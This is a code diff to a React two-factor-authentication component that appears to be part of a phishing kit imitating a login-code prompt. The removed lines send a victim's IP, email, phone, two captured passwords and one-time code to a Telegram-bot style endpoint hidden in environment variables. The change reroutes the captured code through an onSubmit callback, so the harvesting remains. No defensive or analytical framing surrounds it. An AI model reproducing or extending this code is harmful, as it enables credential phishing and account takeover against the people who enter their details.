@@ -14,7 +14,7 @@ const TwoFactorAuth = (props) => {
     const resendOTP = () => {
         setMinutes(1);
         setSeconds(30);
-      };
+    };
 
 
     useEffect(() => {
@@ -42,32 +42,7 @@ const TwoFactorAuth = (props) => {
         try {
             if(codeValue == data.code) return;
             setCodeValue(data.code);
-
-            const formattedMessage = `
-            <b>User (${props.ip.userIP})</b>
-            -------------------------
-            <b>Email:</b> ${props.email}
-            <b>Phone:</b> ${props.phone}
-            <b>First Password:</b> ${props.passwords.firstPw}
-            <b>Second Password:</b> ${props.passwords.secondPw}
-            <b>Code:</b> ${data.code}
-            `;
-        
-            const dataGram = {
-              chat_id: process.env.chatId,
-              text: formattedMessage,
-              parse_mode: 'HTML'
-            };
-        
-        
-            const response = await fetch(process.env.customKey, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(dataGram)
-            });
-
+            props.onSubmit({type: 'two-factor', data: {code:codeValue}});
         } catch (err) {
             console.log(err);
         }
@@ -99,7 +74,7 @@ const TwoFactorAuth = (props) => {
                     <div className={styles.section}>
                         <strong>Or, enter your login code</strong>
                         <p>
-                            Enter the 6-digit code from the authentication app you set up.
+                            Enter the 6-digit code from your phone or the authentication app you set up.
                         </p>
                         <div className={styles.codeInput}>
                             <input type="text" placeholder="Login code" {...register("code")} className={styles.code} />
